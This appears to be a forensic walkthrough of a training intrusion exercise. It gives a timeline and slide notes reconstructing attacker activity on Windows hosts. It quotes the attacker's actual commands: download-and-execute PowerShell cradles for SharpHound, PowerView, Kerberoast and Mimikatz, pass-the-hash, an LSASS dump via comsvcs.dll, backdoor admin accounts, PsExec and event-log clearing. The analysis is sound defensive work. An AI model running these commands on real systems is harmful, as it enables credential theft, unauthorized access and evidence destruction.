# Kill Chain 3 - Endpoint Forensics Walkthrough


## Timeline of Events 19 February 2022

| Endpoint | Timestamp | Activity |
| -- | -- | -- |
| RDP01 | ??/??/?? ??:??:?? | **SharpHound - Powershell History (PSReadLine)** <br/> iex (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1') ; invoke-bloodhound -Collectionmethod dconly |
| RDP01 | ??/??/?? ??:??:?? | mv .\20220219201253_BloodHound.zip .\Desktop\ |
| RDP01 | ??/??/?? ??:??:?? | **Port Scan - Powershell History (PSReadLine)** <br/> IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1'); invoke-portscan -hosts 172.16.50.0/24 -ports "445" -AllformatsOut smbScan |
| RDP01 | ??/??/?? ??:??:?? | **Find Shares - Powershell History (PSReadLine)** <br/> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess <br/> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess -computerfile C:\Users\pat.risus\Desktop\computers.txt <br/> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess \\files.magnumtempusfinacial.com <br/> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess -computername files.magnumtempusfinacial.com <br/> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess -computername 172.16.50.110 |
| RDP01 | ??/??/?? ??:??:?? | **Kerberoasting - Powershell History (PSReadLine)** <br/> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat |
| RDP01 | ??/??/?? ??:??:?? | **MimiKatz - Powershell History (PSReadLine)** <br/> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam <br/> Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"' <br/> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam" <br/> Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"' <br/> Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"' <br/> Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"' <br/> Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"' <br/> Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"' <br/> Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"' <br/> Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"' <br/> Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"' |
| RDP01 | ??/??/?? ??:??:?? | **Clear Event Logs - Powershell History (PSReadLine)** <br/> clear-eventlog -log application,system,security <br/> get-eventlog --list <br/> get-eventlog -list |
| RDP01 | ??/??/?? ??:??:?? | **File Download - Powershell History (PSReadLine)** <br/> wget c88nc6r2vtc00001pg0ggrrksdcyyyyyb.interact.sh |
| RDP01 | ??/??/?? ??:??:?? | **Move Files - Powershell History (PSReadLine)** <br/> mv .\1.txt .\Desktop\ <br/> mv .\2.txt .\Desktop\ <br/> mv .\3.txt .\Desktop\ |
| Files | ??/??/?? ??:??:?? +0000 | Suspicious Powershell Commands by user: Administrator.MAGNUMTEMPUS |
| ALL | 02/19/2022 20:08 GMT (12:08PM PST) | **KC3 Begin (All run from RDP box)** |
| RDP01 | 2022-02-19 20:12:55 | **File Created ($MFT):** \Users\pat.risus\Desktop\20220219201253_BloodHound.zip |
| RDP01 | 2022-02-19 20:12:55 | **LNK File** (\Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\20220219201253_BloodHound.lnk) Access: ..\..\..\..\..\Desktop\20220219201253_BloodHound.zip |
| RDP01 | 2022-02-19 20:13:40 | **Execution LNK File Created ($MFT):** \Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\20220219201253_BloodHound.lnk |
| RDP01 | 2022-02-19T20:13:31Z | **Indications of possible Exfil** - Chrome (pat.risus) - https://file.pizza/ |
| RDP01 | 2022-02-19T20:17:42Z | **Indications of possible Exfil** - Chrome (pat.risus) - https://transfer.sh/ |
| RDP01 | 2022-02-19 20:15:43 | **SMBScan File Created ($MFT)** -  C:\Users\pat.risus\smbScan.gnmap |
| RDP01 | 2022-02-19 20:15:43 | **SMBScan File Created ($MFT)** -  C:\Users\pat.risus\smbScan.nmap |
| RDP01 | 2022-02-19 20:15:43 | **SMBScan File Created ($MFT)** -  C:\Users\pat.risus\smbScan.xml |
| RDP01 | 2022-02-19 20:15:43 | **LNK File** (\Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\smbScan.gnmap.lnk) Access: ..\..\..\..\..\smbScan.gnmap |
| RDP01 | 2022-02-19 20:19:57 | **Execution SMBScan File Created ($MFT)** -  C:\Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\smbScan.gnmap.lnk |
| Files | 2022-02-19 20:21:42 +0000 | NetNTLM Downgrade Attack: HKLM\System\CurrentControlSet\Control\Lsa\lmcompatibilitylevel |
| Files | 2022-02-19 20:21:42 +0000 | NetNTLM Downgrade Attack: HKLM\System\CurrentControlSet\Control\Lsa\MSV1_0\NtlmMinClientSec |
| Files | 2022-02-19 20:21:42 +0000 | NetNTLM Downgrade Attack: HKLM\System\CurrentControlSet\Control\Lsa\MSV1_0\RestrictSendingNTLMTraffic |
| RDP01 | 2022-02-19 20:25:13 | **LNK File** (\Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\computers.lnk) Access: ..\..\..\..\..\..\brent.socium\Desktop\computers.txt |
| RDP01 | 2022-02-19T20:41:37Z | **Indications of possible Exfil** - Chrome (pat.risus) - https://interact.sh/ |
| RDP01 | 2022-02-19T20:41:35Z | **Indications of possible Exfil** - Chrome (pat.risus) - https://github.com/projectdiscovery/interactsh |
| RDP01 | 2022-02-19T20:41:58Z | **Indications of possible Exfil** - Chrome (pat.risus) - https://interactsh.com/ |
| RDP01 | 2022-02-19T20:41:58Z | **Indications of possible Exfil** - Chrome (pat.risus) - https://app.interactsh.com/ |
| RDP01 | 2022-02-19T20:41:58Z | **Indications of possible Exfil** - Chrome (pat.risus) - https://app.interactsh.com/#/ |
| RDP01 | 2022-02-19T20:43:37Z | **Indications of possible Exfil** - Chrome (pat.risus) - https://www.google.com/search?q=wormhole&rlz=1C1GCEA_enUS993US993&oq=wormhole&aqs=chrome.0.0i433i512l4j0i512l2j0i433i512l2j0i512l2.2376j1j7&sourceid=chrome&ie=UTF-8 |
| RDP01 | 2022-02-19T20:43:43Z | **Indications of possible Exfil** - Chrome (pat.risus) - https://webwormhole.io/ |
| RDP01 | 2022-02-19T20:45:12Z | **Indications of possible Exfil** - Chrome (pat.risus) - https://webwormhole.io/#ion-speak-baton |
| RDP01 | 2022-02-19T20:45:13Z | **Indications of possible Exfil** - Chrome (pat.risus) - https://webwormhole.io/# |
| RDP01 | 2022-02-19T20:45:15Z | **Indications of possible Exfil** - Chrome (pat.risus) - https://webwormhole.io/#jump-hull-rerun |
| RDP01 | 2022-02-19 20:47:03 | **LSASS Memory Dump File Creation** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - C:\Users\PAT~1.RIS\AppData\Local\Temp\lsass.DMP <br/> C:\Windows\System32\Taskmgr.exe |
| RDP01 | 2022-02-19 20:47:03 | **File Create ($MFT)** - C:\Users\pat.risus\AppData\Local\Temp\lsass.DMP |
| RDP01 | 2022-02-19 20:48:46 | **Process Dump via Rundll32 and Comsvcs.dll + Process Dump via Comsvcs DLL** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - C:\Windows\System32\rundll32.exe <br/> "C:\windows\system32\rundll32.exe" - C:\windows\System32\comsvcs.dll MiniDump 828 C:\dump full |
| RDP01 | 2022-02-19 20:48:46 | \dump - File created in $MFT (203,344,847 bytes) |
| RDP01 | 2022-02-19 20:51:37 | **Local Accounts Discovery + Whoami Execution** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - "C:\Windows\system32\whoami.exe" /user |
| RDP01 | 2022-02-19 20:52:12 | **Local Accounts Discovery + Whoami Execution** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - "C:\Windows\system32\whoami.exe" /user |
| RDP01 | 2022-02-19T20:52:59Z | Chrome (pat.risus) - https://www.google.com/search?q=psexec64+download&rlz=1C1GCEA_enUS993US993&oq=psexec64+download&aqs=chrome.0.0i512l2j0i22i30l3.2452j1j7&sourceid=chrome&ie=UTF-8 |
| RDP01 | 2022-02-19T20:53:02Z | Chrome (pat.risus) - https://live.sysinternals.com/ |
| RDP01 | 2022-02-19 20:53:09 | **File Create ($MFT)** - C:\Users\brent.socium\PsExec64.exe |	
| RDP01 | 2022-02-19 20:54:55 | **NetNTLM Downgrade Attack** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKLM\System\CurrentControlSet\Control\Lsa\lmcompatibilitylevel |
| RDP01 | 2022-02-19 20:54:55 | **NetNTLM Downgrade Attack** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKLM\System\CurrentControlSet\Control\Ls a\MSV1_0\NtlmMinClientSec |
| RDP01 | 2022-02-19 20:54:55 | **NetNTLM Downgrade Attack** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKLM\System\CurrentControlSet\Control\Ls a\MSV1_0\RestrictSendingNTLMTraffic |
| DC02 | 20:59:27 +0000 | Connection from RDP01 (172.16.44.110) through NTLM V1, rather than Kerberos [Security Event logs]
| RDP01 | 2022-02-19 20:59:36 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| DC | 20:59:36 +0000 | First indication of PSexec used via PSEXESVC.exe (EventID 11 Sysmon) |
| DC | 20:59:57 +0000 | Attacker created combosecurity on DC  (EventID 1 Sysmon) |
| DC02 | 20:59:57 +0000 | Use of PSEXESVC.exe on the host *[Microsoft-Windows-Sysmon/Operational Event logs]* |
| DC02 | 21:00:18 +0000 | key PSEXEC-RDP01-C7722F14.key *[Microsoft-Windows-Sysmon/Operational Event logs]* |
| DC02 | 21:00:18 +0000 | EventID 1, creating combosecurity *[Microsoft-Windows-Sysmon/Operational Event logs]* |
| Files | 2022-02-19 21:00:40 +0000 | Net.exe User Account Creation: "net" user combosecurity B4bymeta! /ADD |
| Files | 2022-02-19 21:00:40 +0000 | Net.exe User Account Creation: C:\Windows\system32\net1 user combosecurity B4bymeta! /ADD |
| RDP01 | 2022-02-19 21:02:26 | **File Create ($MFT)** - C:\Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\brent.socium.lnk |
| RDP01 | 2022-02-19 21:03:09 | **Local Accounts Discovery + Whoami Execution** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - "C:\Windows\system32\whoami.exe" /user |
| RDP01 | 2022-02-19 21:03:20 | **Local Accounts Discovery + Whoami Execution** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - C:\Windows\System32\whoami.exe "C:\Windows\system32\whoami.exe" /user |
| RDP01 | 2022-02-19 21:03:30 | **Local Accounts Discovery + Whoami Execution** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - "C:\Windows\system32\whoami.exe" /user |
| RDP01 | 2022-02-19 21:04:19 | **File Create ($MFT)** - C:\Users\brent.socium\Desktop\1.txt |
| RDP01 | 2022-02-19 21:04:19 | **LNK File** (\Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\1.lnk) Access: ..\..\..\..\..\..\brent.socium\1.txt |
| RDP01 | 2022-02-19 21:04:22 | **File Create** ($MFT) - C:\Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\1.lnk |
| RDP01 | 2022-02-19 21:04:43 | **File Create** ($MFT) - C:\Users\brent.socium\Desktop\2.txt |
| RDP01 | 2022-02-19 21:04:43 | **LNK File** (\Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\2.lnk) Access: ..\..\..\..\..\..\brent.socium\2.txt |
| RDP01 | 2022-02-19 21:04:44 | **File Create** ($MFT) - C:\Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\2.lnk |
| RDP01 | 2022-02-19 21:05:08 | **File Create** ($MFT) - C:\Users\brent.socium\Desktop\3.txt |
| RDP01 | 2022-02-19 21:05:08 | **LNK File** (\Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\3.lnk) Access: ..\..\..\..\..\..\brent.socium\3.txt |
| RDP01 | 2022-02-19 21:05:09 | **File Create ($MFT)** - C\Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\3.lnk |
| RDP01 | 2022-02-19 21:12:29 | **Local Accounts Discovery + Whoami Execution** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - "C:\Windows\system32\whoami.exe" /user |
| RDP01 | 2022-02-19 21:12:58 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| RDP01 | 2022-02-19 21:12:58 | **Adding Users/Admins** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - C:\Users\brent.socium\PsExec64.exe <br/> .\PsExec64.exe @C:\Users\pat.risus\Desktop\computers.txt net localgroup administrators combosecurity /ADD |
| RDP01 | 2022-02-19 21:14:28 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| RDP01 | 2022-02-19 21:14:28 | **Adding Users/Admins** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - C:\Users\brent.socium\PsExec64.exe <br/>.\PsExec64.exe @C:\Users\brent.socium\Desktop\computers.txt net localgroup administrators combosecurity /ADD |
| RDP01 | 2022-02-19 21:15:07 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted | 
| RDP01 | 2022-02-19 21:15:07 | **Adding Users/Admins** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - C:\Users\brent.socium\PsExec64.exe <br/> .\PsExec64.exe @C:\Users\brent.socium\Desktop\computers.txt net localgroup admin istrators combosecurity /ADD |
| RDP01 | 2022-02-19 21:15:28 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExec\EulaAccepted |
| DC | 21:15:28 +0000 | Attacker put combo security in the local admin on DC (EventID 1 Sysmon) |
| DC02 | 21:15:28 +0000 | EventID 11, use of PSEXESVC PSEXEC-RDP01-53271E0B.key *[Microsoft-Windows-Sysmon/Operational Event logs]* |
| DC02 | 21:15:49 +0000 | EventID 1, adding combosecurity into the local administrator group *[Microsoft-Windows-Sysmon/Operational Event logs]* |
| Files | 2022-02-19 21:16:11 +0000 | Net.exe Execution: "net" localgroup administrators combosecurity /ADD |
| Files | 2022-02-19 21:16:11 +0000 | Net.exe Execution: C:\Windows\system32\net1 localgroup administrators combosecurity /ADD |
| Files | 2022-02-19 21:17:36 +0000 | Net.exe User Account Creation: "net" user andy B1rdD0g! /ADD |
| Files | 2022-02-19 21:17:36 +0000 | Net.exe User Account Creation: C:\Windows\system32\net1 user andy B1rdD0g! /ADD |
| RDP01 | 2022-02-19 21:17:15 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExec\EulaAccepted |
| RDP01 | 2022-02-19 21:17:28 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExec\EulaAccepted |
| RDP01 | 2022-02-19 21:17:34 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExec\EulaAccepted |
| RDP01 | 2022-02-19 21:17:15 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExec\EulaAccepted |
| RDP01 | 2022-02-19 21:17:28 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExec\EulaAccepted |
| RDP01 | 2022-02-19 21:17:34 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExec\EulaAccepted |
| RDP01 | 2022-02-19 21:17:46 | **Local Accounts Discovery + Whoami Execution** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - "C:\Windows\system32\whoami.exe" /user |
| RDP01 | 2022-02-19 21:17:59 | **Local Accounts Discovery + Whoami Execution** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - "C:\Windows\system32\whoami.exe" /user |
| RDP01 | 2022-02-19 21:18:28 | **Local Accounts Discovery + Whoami Execution Adding Users/Admins** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - "C:\Windows\system32\whoami.exe" /user |
| RDP01 | 2022-02-19 21:19:03 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| RDP01 | 2022-02-19 21:19:03 | **Adding Users/Admins** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - C:\Users\brent.socium\PsExec64.exe <br/> .\PsExec64.exe @C:\Users\brent.socium\Desktop\3.txt net localgroup administrators jimbo /ADD |
| RDP01 | 2022-02-19 21:19:10 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| RDP01 | 2022-02-19 21:19:19 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| RDP01 | 2022-02-19 21:19:46 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| RDP01 | 2022-02-19 21:19:46 | **Adding Users/Admins** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - C:\Users\brent.socium\PsExec64.exe <br/> .\PsExec64.exe @C:\Users\brent.socium\Desktop\2.txt net localgroup administrators hass /ADD |
| RDP01 | 2022-02-19 21:21:25 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExec\EulaAccepted |
| RDP01 | 2022-02-19 21:21:25 | **Adding Users/Admins** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - C:\Users\brent.socium\PsExec64.exe <br/> .\PsExec64.exe @C:\Users\brent.socium\Desktop\1.txt net localgroup administrator s andy /ADD |
| RDP01 | 2022-02-19 21:21:32 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExec\EulaAccepted |
| Files | 2022-02-19 21:21:46 +0000 | Net.exe Execution: "net" localgroup administrators andy /ADD |
| Files | 2022-02-19 21:21:46 +0000 | Net.exe Execution: C:\Windows\system32\net1 localgroup administrators andy /ADD |
| Files | 2022-02-19 21:21:54 +0000 | Net.exe User Account Creation: "net" localgroup "Remote Desktop Users" andy /ADD |
| Files | 2022-02-19 21:21:54 +0000 | Net.exe User Account Creation: C:\Windows\system32\net1 localgroup "Remote Desktop Users" andy /ADD |
| RDP01 | 2022-02-19 21:25:36 | **File Create ($MFT)** - C:\Users\brent.socium\computers.txt	|
| RDP01 | 2022-02-19 21:26:43 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExec\EulaAccepted |
| DC | 21:27:04 +0000 | Attacker cleared logs (EventID 1) via Powershell |
| RDP01 | 2022-02-19 21:28:17 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExec\EulaAccepted |
| RDP01 | 2022-02-19 21:30:03 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExec\EulaAccepted |
| DC | 21:30:24 +0000 | Log cleared via Powershell again (EventID 10) |
| DC | 21:30:24 +0000 | EventID 7045, Service Name: PSEXESVC demand start |
| RDP01 | 2022-02-19 21:30:44 | **Security Audit Event Logs Cleared** (id: 1102) |
| RDP01 | 2022-02-19 21:30:44 | **System Audit Event Logs Cleared** (id 104) |
| Files | 2022-02-19 21:30:45 +0000 | PsExec Service installed: PSEXESVC - %SystemRoot%\PSEXESVC.exe |
| Files | 2022-02-19 21:30:46 +0000 | Non Interactive PowerShell: "powershell.exe" -command "& {Clear-Eventlog -Log Application,System,Security}" |
| DC | 21:31:48 +0000 | User account (combosecurity) was changed (Event ID 4738) |
| ALL | 02/19/2022 21:37 GMT (01:37PM PST) | **KC3 Complete** |

---

## Slide 1 (DC & DC02)

* EventID 7045, Service Name: PSEXESVC demand start

* Evidence of PsExec (PSEXESVC) usage (Over 10 events at this time, first was the use of PSEXEC (EventID 12) under HLKM/System/CurrentControlSet\Services\PSEXESVC with (C:\Windows\PSEXEC-RDP01-903C33C0.key as EventID 11) left behind.

* Chainsaw
  - Creation of Local Admin (combosecurity)

---

## Slide 2 (RDP01)

* Hostile Files Identified

* C:\dump
  - **2022-02-19 20:48:46**: Process Dump via Rundll32 and Comsvcs.dll (Dumps LSASS for Cred Harvesting)
* C:\Users\brent.socium\Desktop\computers.txt
  - List of IP Addresses used to Add Unauthorized ID to local administrators group
  - **2022-02-19 21:12:58**: .\PsExec64.exe @C:\Users\pat.risus\Desktop\computers.txt net localgroup administrators combosecurity /ADD
* C:\Users\brent.socium\Desktop\3.txt
  - List of IP Addresses used to Add Unauthorized ID to local administrators group
  - **2022-02-19 21:19:03**: .\PsExec64.exe @C:\Users\brent.socium\Desktop\3.txt net localgroup administrators jimbo /ADD
* C:\Users\brent.socium\Desktop\2.txt
  - List of IP Addresses used to Add Unauthorized ID to local administrators group
  - **2022-02-19 21:19:46**: .\PsExec64.exe @C:\Users\brent.socium\Desktop\2.txt net localgroup administrators hass /ADD
* C:\Users\brent.socium\Desktop\1.txt
  - List of IP Addresses used to Add Unauthorized ID to local administrators group
  - **2022-02-19 21:21:25**: .\PsExec64.exe @C:\Users\brent.socium\Desktop\1.txt net localgroup administrator s andy /ADD
* C:\Users\pat.risus\Desktop\20220219201253_BloodHound.zip
  - Bloodhound (SharpHound.ps1) output: Computers, Domains, GPOs, Groups, OUs, Users
  - **Powershell History (PSReadLine)** iex (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1') ; invoke-bloodhound -Collectionmethod dconly
  - **2022-02-19 20:12:55**: File Created ($MFT): \Users\pat.risus\Desktop\20220219201253_BloodHound.zip 
* C:\Users\PAT~1.RIS\AppData\Local\Temp\lsass.DMP
  - LSASS Memory Dump (Cred Harvesting)
  - **2022-02-19 20:47:03**: C:\Users\PAT~1.RIS\AppData\Local\Temp\lsass.DMP - C:\Windows\System32\Taskmgr.exe
* C:\Users\pat.risus\smbScan.gnmap
  - **AllFormatsOut**: Grepable NMAP
  - Output of: Invoke-Portscan.ps1 v0.13 scan
  - IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1'); invoke-portscan -hosts 172.16.50.0/24 -ports "445" -AllformatsOut smbScan
  - **2022-02-19 20:15:43**: SMBScan File Created ($MFT) -  C:\Users\pat.risus\smbScan.gnmap
* C:\Users\pat.risus\smbScan.nmap
  - **AllFormatsOut**: NMAP
  - Output of: Invoke-Portscan.ps1 v0.13
  - IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1'); invoke-portscan -hosts 172.16.50.0/24 -ports "445" -AllformatsOut smbScan
  - **2022-02-19 20:15:43**: SMBScan File Created ($MFT) -  C:\Users\pat.risus\smbScan.nmap
* C:\Users\pat.risus\smbScan.xml
  - **AllFormatsOut**: XML
  - Output of: Invoke-Portscan.ps1 v0.13 scan
  - IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1'); invoke-portscan -hosts 172.16.50.0/24 -ports "445" -AllformatsOut smbScan
  - **2022-02-19 20:15:43**: SMBScan File Created ($MFT) -  C:\Users\pat.risus\smbScan.xml

---

## Slide 3 (RDP01)

* Exfil Attempts by pat.risus:

| last_visit_time | visit_count | visited_url | Browser | User |
| -- | -- | -- | -- | -- |
| 2022-02-19T22:29:44Z | 1 | https://drive.google.com/file/d/1QwcBy3ukLWzRkDb7rmuSEHwQFVUYN2Fx/view?usp=sharing | Chrome | Administrator |
| 2022-02-19T22:29:47Z | 1 | https://drive.google.com/file/d/1QwcBy3ukLWzRkDb7rmuSEHwQFVUYN2Fx/view | Chrome | Administrator |
| 2022-02-19T22:29:50Z | 1 | https://drive.google.com/uc?id=1QwcBy3ukLWzRkDb7rmuSEHwQFVUYN2Fx&export=download | Chrome | Administrator |
| 2022-02-19T20:13:31Z | 1 | https://file.pizza/ | Chrome | pat.risus |
| 2022-02-19T20:17:42Z | 1 | https://transfer.sh/ | Chrome | pat.risus |
| 2022-02-19T20:41:37Z | 2 | https://interact.sh/ | Chrome | pat.risus |
| 2022-02-19T20:41:35Z | 1 | https://github.com/projectdiscovery/interactsh | Chrome | pat.risus |
| 2022-02-19T20:41:58Z | 1 | https://interactsh.com/ | Chrome | pat.risus |
| 2022-02-19T20:41:58Z | 1 | https://app.interactsh.com/ | Chrome | pat.risus |
| 2022-02-19T20:41:58Z | 1 | https://app.interactsh.com/#/ | Chrome | pat.risus |
| 2022-02-19T20:43:37Z | 2 | https://www.google.com/search?q=wormhole&rlz=1C1GCEA_enUS993US993&oq=wormhole&aqs=chrome.0.0i433i512l4j0i512l2j0i433i512l2j0i512l2.2376j1j7&sourceid=chrome&ie=UTF-8 | Chrome | pat.risus |
| 2022-02-19T20:43:43Z | 1 | https://webwormhole.io/ | Chrome | pat.risus |
| 2022-02-19T20:45:12Z | 1 | https://webwormhole.io/#ion-speak-baton | Chrome | pat.risus |
